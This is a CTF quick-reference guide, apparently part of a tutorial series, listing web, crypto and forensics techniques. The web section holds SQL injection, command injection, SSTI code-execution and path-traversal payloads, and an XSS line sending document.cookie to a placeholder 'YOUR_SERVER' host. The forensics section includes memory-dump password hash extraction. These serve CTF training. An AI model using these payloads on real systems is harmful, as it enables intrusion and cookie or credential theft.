# 07 — CTF Writeups: Payloads

> Quick-reference payloads commonly needed during CTF challenges.

> 📋 **What You Will Do In This Section**
> - [ ] Have ready-to-use payloads for Web, Crypto, and Forensics CTF challenges
> - [ ] Quickly decode common encodings (Base64, hex, ROT13, XOR)
> - [ ] Extract hidden data from files and network captures

---

## 🔴 Web CTF Payloads

> 💡 **Why This Matters**
> In timed CTFs, having payloads ready saves critical minutes. These are the most commonly needed web payloads — copy-paste them directly into Burp or curl.

```
# SQLi auth bypass (try these first)
' OR 1=1-- -
admin'-- -
' UNION SELECT 1,2,3-- -
' UNION SELECT null,null,null-- -

# XSS
<script>alert(document.cookie)</script>
<img src=x onerror=fetch('http://YOUR_SERVER/'+document.cookie)>
<svg onload=alert(1)>

# SSTI (Server-Side Template Injection)
{{7*7}}                              → If output = 49, SSTI confirmed
{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}

# Command injection
; cat flag.txt
$(cat flag.txt)
`cat flag.txt`
| cat flag.txt
& cat flag.txt

# PHP type juggling
"0e123" == "0e456" → TRUE (both equal 0 in loose comparison)
# Use for: magic hash comparisons where md5 starts with 0e

# Path traversal
../../etc/passwd
../../flag.txt
..%2f..%2f..%2fflag.txt
```

#### 🧪 Try It Now — Web Payload Quick Test

```bash
echo "=== Web CTF Payload Checklist ==="
echo ""
echo "1. Try SQLi on login forms:"
echo "   username: admin' OR 1=1-- -"
echo "   password: anything"
echo ""
echo "2. Try SSTI in input fields:"
echo "   {{7*7}} → If you see 49, it's vulnerable"
echo ""
echo "3. Try command injection:"
echo "   Input: ; cat flag.txt"
echo ""
echo "4. Check source code:"
echo "   curl -s TARGET | grep -i 'flag\|hidden\|comment\|<!--'"
```

---

## 🔴 Crypto CTF Quick Reference

> 💡 **Why This Matters**
> Crypto challenges require specific decoding functions. Having these Python snippets ready means you spend time thinking about the puzzle, not debugging syntax.

```python
# XOR cipher (single-byte brute force)
def xor_brute(data):
    for key in range(256):
        result = bytes([b ^ key for b in data])
        if b'flag' in result or b'CTF' in result:
            print(f"Key={key}: {result}")

# Multi-byte XOR
def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Base64
import base64
base64.b64decode('encoded_string')

# Hex
bytes.fromhex('hex_string')

# ROT13
import codecs
codecs.decode('grfg', 'rot_13')

# Caesar cipher brute force
def caesar_brute(text):
    for shift in range(26):
        result = ''.join(
            chr((ord(c) - ord('a') + shift) % 26 + ord('a')) if c.islower()
            else chr((ord(c) - ord('A') + shift) % 26 + ord('A')) if c.isupper()
            else c for c in text
        )
        print(f"Shift {shift:2d}: {result}")

# RSA (small e, small n)
from Crypto.Util.number import long_to_bytes, inverse
# If n is small → factorize at factordb.com
# p, q = factors of n
# phi = (p-1) * (q-1)
# d = inverse(e, phi)
# m = pow(c, d, n)
# plaintext = long_to_bytes(m)
```

#### 🧪 Try It Now — Crypto Practice

```bash
echo "=== Decode These ==="
echo ""
echo "1. Base64: $(echo 'ZmxhZ3t0ZXN0fQ==' | base64 -d)"
echo ""
echo "2. Hex: $(echo '666c61677b746573747d' | xxd -r -p)"
echo ""
echo "3. ROT13: $(echo 'synt{grfg}' | tr 'a-zA-Z' 'n-za-mN-ZA-M')"
echo ""
echo "All decoded to the same thing!"
```

> ✅ **Expected Output**
> ```
> 1. Base64: flag{test}
> 2. Hex: flag{test}
> 3. ROT13: flag{test}
> ```

---

## 🔴 Forensics Payloads

> 💡 **Why This Matters**
> Forensics challenges hide flags in files, images, network captures, and memory dumps. These commands extract hidden data — run them in order when you get an unknown file.

```bash
# Step 1: Identify file type (ALWAYS DO THIS FIRST)
file mystery_file
exiftool mystery_file

# Step 2: Search for flag directly
strings mystery_file | grep -i flag
strings mystery_file | grep -iE "CTF{|flag{|picoCTF{"

# Step 3: Extract hidden/embedded files
binwalk mystery_file           # List embedded files
binwalk -e mystery_file        # Auto-extract embedded files
foremost mystery_file          # File carving (alternative to binwalk)

# Step 4: Steganography (if it's an image)
steghide extract -sf image.jpg -p ""     # Empty password (common in easy CTFs)
steghide extract -sf image.jpg -p "password"
zsteg image.png                           # PNG steganography

# Step 5: Memory dump analysis
volatility -f memory.dmp imageinfo        # Identify OS
volatility -f memory.dmp --profile=Win7SP1x64 hashdump
volatility -f memory.dmp --profile=Win7SP1x64 lsadump
volatility -f memory.dmp --profile=Win7SP1x64 filescan | grep flag

# Step 6: PCAP (network capture) analysis
strings capture.pcap | grep -i flag
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name  # DNS exfiltration
```

---

## 📋 CTF Payload Decision Tree

```
Got a URL?
  → View source, check cookies, try SQLi, SSTI, command injection

Got a file?
  → file → strings | grep flag → binwalk -e → exiftool

Got encrypted text?
  → Try Base64 → Hex → ROT13 → CyberChef magic

Got a PCAP?
  → strings | grep flag → tshark HTTP → Wireshark follow streams

Got a binary?
  → file → checksec → strings → ltrace/strace → GDB/Ghidra

Got an image?
  → exiftool → steghide/zsteg → binwalk → strings
```

---

## 🧠 If You're Stuck

1. **Unknown file**: Run `file`, `strings`, `binwalk`, `exiftool` — in that order
2. **Crypto looks impossible**: Paste into CyberChef and try the "Magic" recipe
3. **Web filter bypassing**: Try URL encoding, double encoding, Unicode, case variation
4. **PCAP too large**: Filter in Wireshark: `http contains "flag"` or `tcp contains "flag"`
